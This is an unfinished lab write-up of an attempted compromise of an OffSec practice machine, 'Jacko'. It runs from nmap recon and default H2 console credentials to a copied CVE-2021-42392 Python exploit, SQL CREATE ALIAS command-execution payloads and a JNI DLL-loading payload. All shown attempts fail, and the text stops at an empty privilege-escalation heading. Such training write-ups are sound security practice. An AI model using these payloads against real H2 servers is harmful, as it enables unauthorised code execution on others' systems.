# Report - Jacko
- Author: Henry Post
- Target: Jacko
- Target IP: 192.168.53.66
- Date: 04/15/2026
# Executive Summary

# Recommendations

# Resources

# Recon

We run `nmap` on our target.

```
???(kali?kali)-[~]
??$ nmap -sS -sV jacko
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-16 00:34 +0000
Nmap scan report for jacko (192.168.53.66)
Host is up (0.00049s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8082/tcp open  http          H2 database http console
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.16 seconds
```

We notice that `80/HTTP` and `8080/H2` are open.

The lab notes mention default H2 credentials.
# Non-SYSTEM access

http://jacko:8082/login.jsp

We can login with `sa:` (blank password).

Version: `H2 1.4.199 (2019-03-13)`

It's annoying to have to write SQL remote code execution, so let's see if someone on exploit-db has already done the hard part for us.

```bash
searchsploit h2
# H2 Database 1.4.199 - JNI Code Execution | java/local/49384.txt

searchsploit --path 49384
# /usr/share/exploitdb/exploits/java/local/49384.txt
## thats a chunky boy of an exploit, we will NOT be pasting it.
```

Syntax error.

Google-fu finds us this:

https://github.com/Be-Innova/CVE-2021-42392-exploit-lab/blob/main/client/h2_exploit.py

```python
import jpype
import jaydebeapi
import argparse
import os
import sys

# Argparser
parser = argparse.ArgumentParser(description="Exploit CVE-2021-42392 - H2 CREATE ALIAS RCE")
parser.add_argument('--url', required=True, help='JDBC URL H2 vulnerable, example jdbc:h2:tcp://h2-vulnerable\:9092/~/test')
parser.add_argument('--cmd', required=True, help='Comamand to execute')
parser.add_argument('--jar', default='/jars/h2.jar', help='.jar file path')

args = parser.parse_args()

# Start JVM with .jar
h2_jar = os.path.expanduser(args.jar)
if not os.path.exists(h2_jar):
    print(f"[✖] JAR not found: {h2_jar}")
    sys.exit(1)

if not jpype.isJVMStarted():
    jpype.startJVM(classpath=[h2_jar])

# JDBC Connection (default credentials)
user = "sa"
password = ""

print(f"[i] Connecting to: {args.url}")
conn = jaydebeapi.connect("org.h2.Driver", args.url, [user, password])
cursor = conn.cursor()

#  H2 version
cursor.execute("SELECT H2VERSION();")
version = cursor.fetchone()[0]
print(f"[i] H2 version: {version}")

# exploit
try:
    cursor.execute("""
        CREATE ALIAS IF NOT EXISTS EXEC AS $$
        void exec(String cmd) throws java.io.IOException {
            Runtime.getRuntime().exec(cmd);
        }
        $$;
    """)
    cursor.execute(f"CALL EXEC('{args.cmd}');")
    print(f"[✔] Command executed: {args.cmd}")
except Exception as e:
    print(f"[✖] Error: {e}")

cursor.close()
conn.close()
```

If we take a closer look at his exploit, we can actually do this manually...

```sql

CREATE ALIAS IF NOT EXISTS EXEC AS $$
	void exec(String cmd) throws java.io.IOException {
		Runtime.getRuntime().exec(cmd);
	}
$$;

CALL EXEC('dir');
```

A bit sad, we get this error.

```c
IO Exception: "java.io.IOException: Cannot run program ""javac"": CreateProcess error=2, The system cannot find the file specified"; SQL statement:
CREATE ALIAS IF NOT EXISTS EXEC AS $$
    void exec(String cmd) throws java.io.IOException {
        Runtime.getRuntime().exec(cmd);
    }
$$ [90028-199] 90028/90028 (Help)


```

Let's ...test it out!

```
wget https://raw.githubusercontent.com/Be-Innova/CVE-2021-42392-exploit-lab/refs/heads/main/client/h2_exploit.py

mv somejar.jar ./
sudo mkdir /jars/

pip install jpype1 --break-system-packages
pip install jaydebeapi --break-system-packages

python h2_exploit.py --url http://jacko:8082 --cmd ls
```

I'm such a knucklehead today.

I can just clone the git repo and run `docker build .` ... I don't need to waste my time un-dockerizing this guy's code.

```sh
git clone https://github.com/Be-Innova/CVE-2021-42392-exploit-lab/
cd CVE-2021-42392-exploit-lab/

sudo apt install -y docker.io docker-compose

sudo groupadd docker
sudo usermod -aG docker $USER 

sudo docker-compose build
```

It fails to build, due to network issues. I think the OFFSEC boxes are limited in what hosts they can connect to.

Okay. I'm...I don't want to consult a guide yet.

```sh
# H2 Database - 'Alias' Arbitrary Code Execution | java/local/44422.py

# https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html

searchsploit h2
searchsploit --path 44422

ls /usr/share/exploitdb/exploits/java/local/44422.py
cp /usr/share/exploitdb/exploits/java/local/44422.py . 

# usage: 44422.py [-h] -H 127.0.0.1:4336 [-d jdbc:h2~/test] [-u username] [-p password]
python 44422.py -H jacko:8082 -u "sa" -p ""
# ERROR - Auth
# Something goes wrong, exiting...
```

I'm not giving up yet. I'm going to try to extract the payload from `44422.py`.

```python
def prepare(url):
    cmd = '''CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;'''
    url = url.replace('login','query')
    r = requests.post(url,data={'sql':cmd})
    if not 'Syntax error' in r.text:
        return url
    return False

def execve(url,cmd):
    r = requests.post(url,data={'sql':"CALL EXECVE('{}')".format(cmd)})
    try:
        print(html.unescape(r.text.split('</th></tr><tr><td>')[1].split('</td>')[0].replace('<br />','\n').replace('&nbsp;',' ')).encode('utf-8').decode('utf-8','ignore'))
    except Exception as e:
        print('Something goes wrong')
        print(e)

```

```sql
-- Payload 1: Create the EXECVE alias (H2 Java stored procedure for RCE)
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;

-- Payload 2: Execute a command via the alias
CALL EXECVE('dir');

-- IO Exception: "java.io.IOException: Cannot run program ""javac"": CreateProcess error=2, The system cannot find the file specified"; SQL statement:
```

Failure. Okay. Time to take a break.

Found a guide.

https://medium.com/@ryanchamruiyang/proving-grounds-jacko-walkthrough-by-ryan-cham-db76be0699f4

```sql
-- H2 allows users to gain code execution by compiling and running Java code  
-- however this requires the Java Compiler to be available on the machine running H2.  
-- This exploit utilises the Java Native Interface to load a a Java class without  
-- needing to use the Java Compiler
-- Load native library  
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";  
CALL System_load('C:\\Windows\\Temp\\JNIScriptEngine.dll');-- Evaluate script  
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";  
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\\\Z").next()');
```

Doesn't work. I think I'm stuck. Darn.
# SYSTEM access